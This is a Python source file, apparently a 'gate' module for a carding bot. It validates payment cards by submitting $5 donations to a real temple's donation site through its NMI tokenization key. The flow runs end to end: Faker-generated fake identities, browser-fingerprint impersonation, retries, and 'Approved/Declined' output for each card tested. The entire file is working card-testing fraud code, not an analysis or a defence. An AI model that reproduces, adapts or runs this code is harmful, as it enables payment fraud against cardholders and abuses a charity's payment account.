# Pure gate motor for 'gt' — no Telegram-bot dependency.

import random, re

from faker import Faker

from urllib.parse import quote

import curl_cffi.requests as creq

_GATEWAY = 'NMI CCN'

_P_TOKEN1 = 'HFrXSJ-sUxMa3-sXbJRb-97Pd6y'

_f = Faker('en_US')

_name = lambda: (_f.first_name().replace(' ', '').replace('.', ''), _f.last_name())

_email = lambda: f"{_f.user_name()}@{random.choice(['hotmail.com', 'gmail.com', 'yahoo.com'])}"

_phone = lambda: f'512678{random.randint(1111, 9999)}'

_street = lambda n: f'{n}+street+{random.randint(1111, 9999)}'

def _found(html, start, end):
    try:
        s = html.index(start) + len(start)
        return html[s:html.index(end, s)]
    except ValueError:
        return ''

def _flow(num, mes, ano, cvv):
    mes = mes.zfill(2)
    ano = ano[-2:] if len(ano) == 4 else ano
    last = ''
    for _ in range(3):
        try:
            sess = creq.Session(impersonate=random.choice(['safari17_0', 'safari17_2_ios', 'safari15_3']))
            ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            fn, ln = _name()
            em, ph, st = (_email(), _phone(), _street(fn))
            r1 = sess.get('https://sanatanmandirtampa.org/donations', timeout=20)
            price_m = re.search('id=["\\\']price[_\\-]?(\\d+)["\\\']', r1.text)
            price_id = price_m.group(1) if price_m else ''
            if not price_id:
                last = 'price_id not found in page'
                continue
            hdrs = {'User-Agent': ua, 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://sanatanmandirtampa.org', 'Referer': 'https://sanatanmandirtampa.org/donations'}
            data = f'ids%5B%5D={price_id}&totalPrice=5&qty%5B%5D=1&ctg%5B%5D=DONATIONS&serviceTypes%5B%5D=GENERAL+DONATIONS&serviceName%5B%5D=Any+Amount&serviceAmount%5B%5D=5.00&cart_type=DONATIONS&image%5B%5D=%2Fuploads%2Fprofile%2Fimage-1777881195809-92689595.png&description%5B%5D=&cart_ctg%5B%5D=DONATIONS&service_desc%5B%5D=&isTextinputBox%5B%5D=NO'
            r2 = sess.post('https://sanatanmandirtampa.org/Donations/addCart', headers=hdrs, data=data, timeout=15)
            if 'Country restrictions' in r2.text:
                last = 'Country restrictions blocked'
                continue
            data = f'fname={ln}&lname={fn}&email={quote(em)}&phone={ph}&countryCode=%2B1&checkStatus=2&state=NEW+YORK&city=NEW+YORK&zipcode=10080&address_line1={st}'
            sess.post('https://sanatanmandirtampa.org/Home/getOrAddCustomer', headers=hdrs, data=data, timeout=15)
            nhdrs = {'Host': 'secure.nmi.com', 'User-Agent': ua, 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://sanatanmandirtampa.org', 'Referer': 'https://sanatanmandirtampa.org/'}
            r4 = sess.post('https://secure.nmi.com/token/api/create', headers=nhdrs, data=f'tokenizationKey={_P_TOKEN1}&cartCorrelationId=&source=16', timeout=20)
            p_tok = _found(r4.text, '"token":"', '"')
            if not p_tok:
                return {'status': False, 'raise': 'No NMI token'}
            jhdrs = {'User-Agent': ua, 'Content-Type': 'application/json;charset=UTF-8', 'Accept': '*/*', 'Origin': 'https://secure.nmi.com', 'Referer': f'https://secure.nmi.com/token/inline.php?tokenizationKey={_P_TOKEN1}&cartCorrelationId=&token={p_tok}&elementId=ccnumber&title=Card%20Number&placeholder=Card%20Number&enableCardBrandPreviews=false'}
            sess.post('https://secure.nmi.com/token/api/save_multipart_token', headers=jhdrs, timeout=15, json={'tokenizationKey': _P_TOKEN1, 'cartCorrelationId': '', 'tokenId': p_tok, 'data': [{'elementId': 'ccnumber', 'value': num}]})
            jhdrs['Referer'] = f'https://secure.nmi.com/token/inline.php?tokenizationKey={_P_TOKEN1}&cartCorrelationId=&token={p_tok}&elementId=ccexp&title=Card%20Expiration&placeholder=MM%2FYY'
            sess.post('https://secure.nmi.com/token/api/save_multipart_token', headers=jhdrs, timeout=15, json={'tokenizationKey': _P_TOKEN1, 'cartCorrelationId': '', 'tokenId': p_tok, 'data': [{'elementId': 'ccexp', 'value': f'{mes}{ano}'}]})
            lhdrs = {'Host': 'secure.nmi.com', 'User-Agent': ua, 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json', 'Origin': 'https://compassionmobility.com', 'Referer': 'https://compassionmobility.com/'}
            sess.post('https://secure.nmi.com/token/api/lookup', headers=lhdrs, timeout=15, json={'tokenId': p_tok, 'tokenizationKey': _P_TOKEN1, 'cartCorrelationId': ''})
            data = f'token={p_tok}&totolAmt=5&name={fn}+{ln}&address={st}&zipcode=10080&general_donation=0&acharya_sambhavana=0'
            r5 = sess.post('https://sanatanmandirtampa.org/NMI_Payment/makePayment', headers=hdrs, data=data, timeout=20)
            rj = r5.json()
            code = str(rj.get('response_code', ''))
            txt = rj.get('response_text', r5.text[:80])
            ok = code == '100'
            return {'status': True, 'success': ok, 'response': f"{('Approved ✅' if ok else 'Declined ❌')} | {txt[:120]}"}
        except Exception as e:
            last = str(e)[:180]
    return {'status': False, 'raise': f'Retries exhausted: {last}'}

def _checker(cc, binData):
    try:
        return _flow(cc[0], cc[1], cc[2], cc[3])
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}

def run_check(cc, bin_data, ctx=None):
    r = _checker(cc, bin_data)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}